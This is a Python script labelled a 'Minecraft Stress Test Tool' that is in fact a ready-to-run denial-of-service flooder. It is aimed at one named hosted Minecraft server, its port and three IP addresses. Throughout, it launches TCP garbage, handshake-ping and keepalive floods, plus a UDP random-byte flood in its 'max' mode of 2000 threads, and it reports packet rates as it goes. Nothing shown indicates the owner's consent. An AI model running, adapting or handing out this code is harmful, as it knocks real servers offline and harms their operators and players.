import socket
import struct
import random
import threading
import time

TARGET = "SquadMC.exaroton.me"
PORT = 37863
TARGET_IPS = ["185.107.193.163", "185.107.194.163", "185.107.192.163"]

INTENSITY = {
    "light":  {"threads": 20,  "delay": 0.3},
    "medium": {"threads": 100, "delay": 0.05},
    "hard":   {"threads": 500, "delay": 0.005},
    "max":    {"threads": 2000, "delay": 0},
}

stats = {"sent": 0, "errors": 0}
lock = threading.Lock()
running = True

def _varint(n):
    d = b''
    while True:
        if n & ~0x7F:
            d += bytes([(n & 0x7F) | 0x80])
            n >>= 7
        else:
            d += bytes([n])
            return d

def make_ping_packet():
    host = TARGET.encode('utf-8')
    buf = b'\x00'
    buf += _varint(767)
    buf += bytes([len(host)]) + host
    buf += struct.pack('>H', PORT)
    buf += b'\x02'
    return _varint(len(buf)) + buf

PING_PKT = make_ping_packet()
GARBAGE = b'\x00' * 4096

def connect_flood():
    global running
    while running:
        ip = random.choice(TARGET_IPS)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, PORT))
            for _ in range(20):
                try:
                    s.send(GARBAGE)
                    with lock: stats["sent"] += 1
                except:
                    break
            s.close()
        except:
            with lock: stats["errors"] += 1

def ping_flood():
    global running
    while running:
        ip = random.choice(TARGET_IPS)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, PORT))
            s.send(PING_PKT)
            try:
                s.recv(4096)
            except:
                pass
            with lock: stats["sent"] += 1
            s.close()
        except:
            with lock: stats["errors"] += 1

def keepalive_flood():
    global running
    while running:
        ip = random.choice(TARGET_IPS)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, PORT))
            for _ in range(100):
                try:
                    s.send(GARBAGE)
                    with lock: stats["sent"] += 1
                except:
                    break
            s.close()
        except:
            with lock: stats["errors"] += 1

def udp_flood():
    global running
    raw = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running:
        ip = random.choice(TARGET_IPS)
        for _ in range(100):
            try:
                s.sendto(raw, (ip, PORT))
                with lock: stats["sent"] += 1
            except:
                with lock: stats["errors"] += 1

def status_printer():
    start = time.time()
    while running:
        time.sleep(2)
        with lock:
            s = stats["sent"]
            e = stats["errors"]
            elapsed = time.time() - start
            rate = s / elapsed if elapsed > 0 else 0
            print(f"\r[>] Sent: {s} | Errors: {e} | Rate: {rate:.0f} pkt/s", end="")
    print()

if __name__ == "__main__":
    print("Minecraft Stress Test Tool v2")
    print("Target: {}:{}".format(TARGET, PORT))
    print()
    print("Select mode:")
    print("  1) light")
    print("  2) medium")
    print("  3) hard")
    print("  4) max")
    print()
    import sys
    ch = sys.argv[1] if len(sys.argv) > 1 else (input("Mode [1-4] (default: 2): ").strip() or "2")
    modes = {"1": "light", "2": "medium", "3": "hard", "4": "max"}
    mode = modes.get(ch, "medium")
    cfg = INTENSITY[mode]

    print(f"\nStarting {mode.upper()}: {cfg['threads']} threads -> {TARGET} ({', '.join(TARGET_IPS)})")
    print("Press Ctrl+C to stop\n")

    threading.Thread(target=status_printer, daemon=True).start()

    funcs = [connect_flood, ping_flood, keepalive_flood]
    if mode == "max":
        funcs.append(udp_flood)

    for f in funcs:
        for _ in range(cfg["threads"] // len(funcs)):
            t = threading.Thread(target=f, daemon=True)
            t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print("\n\nStopped.")
